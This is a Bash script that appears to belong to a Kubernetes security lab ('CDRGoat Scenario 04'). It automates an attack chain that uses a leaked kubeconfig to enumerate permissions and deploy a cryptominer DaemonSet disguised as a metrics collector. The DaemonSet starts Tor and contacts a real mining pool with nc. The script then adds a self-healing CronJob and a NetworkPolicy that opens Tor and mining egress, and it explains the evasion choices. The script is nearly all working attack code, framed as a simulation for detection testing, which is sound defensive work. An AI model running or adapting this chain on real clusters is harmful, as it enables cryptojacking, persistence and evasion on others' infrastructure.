#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Kubernetes - Scenario 04                ===" "${RESET}"
  printf "%sLeaked Kubeconfig -> Cryptominer DaemonSet -> Persistence%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  Step  1.  Authenticate with leaked kubeconfig\n"
  printf "  Step  2.  Enumerate permissions (namespace-scoped)\n"
  printf "  Step  3.  Deploy cryptominer DaemonSet\n"
  printf "  Step  4.  Create CronJob persistence (self-healing)\n"
  printf "  Step  5.  Modify NetworkPolicy (allow Tor egress)\n"
  printf "  Step  6.  Verify mining operation\n"
}
banner

NAMESPACE="cdrgoat-sc04"

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in kubectl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Kubeconfig input
#############################################
printf "\n"
step "Leaked kubeconfig setup"
if [ -n "${KUBECONFIG:-}" ] && [ -f "$KUBECONFIG" ]; then
  ok "Using KUBECONFIG from environment: ${YELLOW}${KUBECONFIG}${RESET}"
else
  info "Provide the path to the leaked kubeconfig file"
  printf "\n"
  read -r -p "  Kubeconfig path: " LEAKED_KUBECONFIG
  if [ ! -f "$LEAKED_KUBECONFIG" ]; then
    err "File not found: $LEAKED_KUBECONFIG"
    exit 1
  fi
  export KUBECONFIG="$LEAKED_KUBECONFIG"
  ok "Kubeconfig set: ${YELLOW}${KUBECONFIG}${RESET}"
fi

read -r -p "Everything is prepared. Press Enter to start the attack (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Authenticate with Leaked Kubeconfig
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Authenticate with Leaked Kubeconfig  ===" "${RESET}"

step "Testing cluster access"
spin_start "kubectl get pods"
set +e
POD_LIST=$(kubectl get pods -n "$NAMESPACE" 2>&1)
K8S_RC=$?
set -e
spin_stop

if [ $K8S_RC -eq 0 ]; then
  ok "Cluster access confirmed!"
  CLUSTER_ENDPOINT=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
  info "API Server: ${YELLOW}${CLUSTER_ENDPOINT}${RESET}"
  info "Namespace: ${YELLOW}${NAMESPACE}${RESET}"
else
  err "Cannot access cluster"
  exit 1
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The attacker found a kubeconfig leaked from CI/CD pipeline logs.\n"
printf "The SA has deployment permissions scoped to a single namespace.\n\n"
printf "This is common: CI/CD pipelines often store kubeconfigs in\n"
printf "environment variables, build logs, or artifact storage.\n\n"

read -r -p "Step 1 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Enumerate Permissions
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate Permissions  ===" "${RESET}"

step "Checking what we can do in namespace ${NAMESPACE}"
spin_start "kubectl auth can-i --list"
AUTH_LIST=$(kubectl auth can-i --list -n "$NAMESPACE" 2>/dev/null | grep -v "^Resources" | head -20)
spin_stop
ok "Permissions in ${YELLOW}${NAMESPACE}${RESET}:"
echo "$AUTH_LIST" | while IFS= read -r line; do printf "  %s\n" "$line"; done

step "Checking cluster-level access"
set +e
CAN_LIST_NS=$(kubectl auth can-i list namespaces 2>/dev/null)
CAN_LIST_NODES=$(kubectl auth can-i list nodes 2>/dev/null)
CAN_DEL_KUBE=$(kubectl auth can-i delete pods -n kube-system 2>/dev/null)
set -e
printf "  list namespaces:          %s\n" "$CAN_LIST_NS"
printf "  list nodes:               %s\n" "$CAN_LIST_NODES"
printf "  delete pods (kube-system): %s\n" "$CAN_DEL_KUBE"

if [ "$CAN_LIST_NS" = "no" ]; then
  ok "Permissions are ${GREEN}namespace-scoped${RESET} - no cluster-wide access"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The SA can deploy workloads (DaemonSets, CronJobs, Pods)\n"
printf "but only within ${YELLOW}${NAMESPACE}${RESET}.\n\n"
printf "No cluster-level access - can't list nodes, create namespaces,\n"
printf "or touch other namespaces. But within this namespace,\n"
printf "the attacker has full deployment control.\n\n"

read -r -p "Step 2 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Deploy Cryptominer DaemonSet
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Deploy Cryptominer DaemonSet  ===" "${RESET}"

step "Deploying miner DaemonSet"
info "DaemonSet runs on every node - one miner per node for max hash rate"
info "Name and labels mimic a legitimate metrics collector"

cat <<'DSEOF' | kubectl apply -n "$NAMESPACE" -f - 2>/dev/null
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-metrics-collector
  labels:
    app: node-metrics-collector
    component: metrics
spec:
  selector:
    matchLabels:
      app: node-metrics-collector
  template:
    metadata:
      labels:
        app: node-metrics-collector
        component: metrics
    spec:
      containers:
        - name: collector
          image: alpine:3.19
          command:
            - sh
            - -c
            - |
              apk add --no-cache tor stress-ng >/dev/null 2>&1

              # 1. Real Tor connection attempt (generates network signal)
              echo "[$(date)] Starting Tor..."
              tor --RunAsDaemon 1 --SocksPort 9050 --Log "notice stdout" 2>&1 &
              sleep 5

              # 2. Real DNS resolution + TCP connection to mining pool
              echo "[$(date)] Connecting to mining pool..."
              echo '{"id":1,"method":"login","params":{"login":"cdrgoat-test","pass":"x"}}' | \
                nc -w 5 pool.supportxmr.com 3333 2>&1 || true

              # 3. Real sustained CPU load (triggers resource anomaly)
              echo "[$(date)] Starting CPU load on $(hostname)..."
              stress-ng --cpu 2 --timeout 120 --metrics-brief 2>&1 &

              echo "[$(date)] All signals active - waiting..."
              sleep infinity
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 500m
              memory: 256Mi
      terminationGracePeriodSeconds: 5
DSEOF

ok "DaemonSet deployed: ${RED}node-metrics-collector${RESET}"

step "Waiting for miner pods to start"
sleep 8
MINER_PODS=$(kubectl get pods -n "$NAMESPACE" -l app=node-metrics-collector -o wide 2>/dev/null)
RUNNING=$(echo "$MINER_PODS" | tail -n +2 | grep -c "Running" || true)
TOTAL=$(echo "$MINER_PODS" | tail -n +2 | wc -l | tr -d ' ')
ok "Miner pods: ${RED}${RUNNING}/${TOTAL}${RESET} running"
echo "$MINER_PODS" | while IFS= read -r line; do printf "  %s\n" "$line"; done

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The DaemonSet ensures a miner pod runs on ${RED}every node${RESET}.\n\n"
printf "Real signals generated (not simulated):\n"
printf "  ${RED}Tor:${RESET} actual tor process started, connects to relay network\n"
printf "  ${RED}Mining pool:${RESET} real stratum protocol handshake to pool.supportxmr.com:3333\n"
printf "  ${RED}CPU:${RESET} stress-ng generates sustained 2-core load for 120 seconds\n\n"
printf "Evasion techniques:\n"
printf "  ${YELLOW}Name:${RESET} node-metrics-collector (looks like monitoring)\n"
printf "  ${YELLOW}Resources:${RESET} low requests (50m CPU) to avoid LimitRange\n"
printf "  ${YELLOW}Image:${RESET} alpine:3.19 (common base image, not flagged)\n\n"

read -r -p "Step 3 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. CronJob Persistence
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. CronJob Persistence (Self-Healing)  ===" "${RESET}"

step "Creating CronJob that re-deploys DaemonSet if deleted"
info "Runs every 5 minutes - self-healing persistence"

cat <<CJEOF | kubectl apply -n "$NAMESPACE" -f - 2>/dev/null
apiVersion: batch/v1
kind: CronJob
metadata:
  name: metrics-health-check
  labels:
    app: metrics-health-check
    component: monitoring
spec:
  schedule: "*/5 * * * *"
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: cicd-deployer-sa
          containers:
            - name: check
              image: bitnami/kubectl:latest
              command:
                - /bin/sh
                - -c
                - |
                  if ! kubectl get daemonset node-metrics-collector -n ${NAMESPACE} >/dev/null 2>&1; then
                    echo "DaemonSet missing - re-creating..."
                    kubectl apply -n ${NAMESPACE} -f - <<'DS'
                  apiVersion: apps/v1
                  kind: DaemonSet
                  metadata:
                    name: node-metrics-collector
                    labels:
                      app: node-metrics-collector
                  spec:
                    selector:
                      matchLabels:
                        app: node-metrics-collector
                    template:
                      metadata:
                        labels:
                          app: node-metrics-collector
                      spec:
                        containers:
                          - name: collector
                            image: alpine:3.19
                            command: ["sh","-c","echo mining && sleep infinity"]
                            resources:
                              requests:
                                cpu: 50m
                                memory: 64Mi
                  DS
                  else
                    echo "DaemonSet OK"
                  fi
          restartPolicy: OnFailure
CJEOF

ok "CronJob deployed: ${RED}metrics-health-check${RESET} (*/5 * * * *)"

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Self-healing persistence: if a defender deletes the DaemonSet,\n"
printf "the CronJob re-creates it within 5 minutes.\n\n"
printf "The CronJob runs as the same CI/CD SA and uses\n"
printf "${RED}bitnami/kubectl${RESET} to interact with the API.\n\n"

read -r -p "Step 4 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Network Policy Modification
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Modify NetworkPolicy (Allow Tor Egress)  ===" "${RESET}"

step "Creating NetworkPolicy to allow mining traffic"
info "Allowing outbound to Tor relay ports (9001, 9030) and mining pool (3333)"

cat <<'NPEOF' | kubectl apply -n "$NAMESPACE" -f - 2>/dev/null
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-metrics-egress
  labels:
    app: node-metrics-collector
spec:
  podSelector:
    matchLabels:
      app: node-metrics-collector
  policyTypes:
    - Egress
  egress:
    - ports:
        - port: 53
          protocol: UDP
        - port: 53
          protocol: TCP
    - ports:
        - port: 9001
          protocol: TCP
        - port: 9030
          protocol: TCP
        - port: 3333
          protocol: TCP
        - port: 443
          protocol: TCP
NPEOF

ok "NetworkPolicy created: ${RED}allow-metrics-egress${RESET}"
printf "  Allowed ports: DNS(53), Tor(9001,9030), Mining(3333), HTTPS(443)\n"

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "NetworkPolicy allows miner pods to reach:\n"
printf "  ${RED}Tor relays${RESET} (9001, 9030) - hides pool connection\n"
printf "  ${RED}Mining pool${RESET} (3333) - stratum protocol\n"
printf "  DNS + HTTPS - for Tor bootstrap and updates\n\n"
printf "NetworkPolicy changes in application namespaces are worth monitoring.\n\n"

read -r -p "Step 5 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Verify Mining Operation
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Verify Mining Operation  ===" "${RESET}"

step "Checking miner pod status"
MINER_STATUS=$(kubectl get pods -n "$NAMESPACE" -l app=node-metrics-collector -o wide 2>/dev/null)
RUNNING_FINAL=$(echo "$MINER_STATUS" | tail -n +2 | grep -c "Running" || true)
ok "Miner pods running: ${RED}${RUNNING_FINAL}${RESET}"
echo "$MINER_STATUS" | while IFS= read -r line; do printf "  %s\n" "$line"; done

step "Reading miner pod logs"
FIRST_POD=$(kubectl get pods -n "$NAMESPACE" -l app=node-metrics-collector -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [ -n "$FIRST_POD" ]; then
  LOGS=$(kubectl logs -n "$NAMESPACE" "$FIRST_POD" --tail=10 2>/dev/null)
  ok "Miner logs from ${YELLOW}${FIRST_POD}${RESET}:"
  echo "$LOGS" | while IFS= read -r line; do printf "  %s%s%s\n" "$RED" "$line" "$RESET"; done
fi

step "Listing all attacker resources in ${NAMESPACE}"
printf "  DaemonSets:\n"
kubectl get daemonsets -n "$NAMESPACE" --no-headers 2>/dev/null | while IFS= read -r line; do printf "    %s\n" "$line"; done
printf "  CronJobs:\n"
kubectl get cronjobs -n "$NAMESPACE" --no-headers 2>/dev/null | while IFS= read -r line; do printf "    %s\n" "$line"; done
printf "  NetworkPolicies:\n"
kubectl get networkpolicies -n "$NAMESPACE" --no-headers 2>/dev/null | while IFS= read -r line; do printf "    %s\n" "$line"; done

################################################################################
# Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}" "FULL ATTACK CHAIN COMPLETE" "${RESET}"
printf "%s\n" "====================================================================="
printf "  ${GREEN}[1]${RESET}  Authenticated with leaked CI/CD kubeconfig\n"
printf "  ${GREEN}[2]${RESET}  Permissions enumerated - namespace-scoped deployer\n"
printf "  ${GREEN}[3]${RESET}  Cryptominer DaemonSet deployed on all nodes\n"
printf "  ${GREEN}[4]${RESET}  CronJob persistence - self-healing every 5 min\n"
printf "  ${GREEN}[5]${RESET}  NetworkPolicy - Tor + mining pool egress allowed\n"
printf "  ${GREEN}[6]${RESET}  Mining operation verified\n"
printf "%s\n" "====================================================================="

step "Cleanup reminder"
info "See README.md for full cleanup instructions."

printf "\n%s%s%s\n\n" "${BOLD}${GREEN}" "Attack simulation complete." "${RESET}"
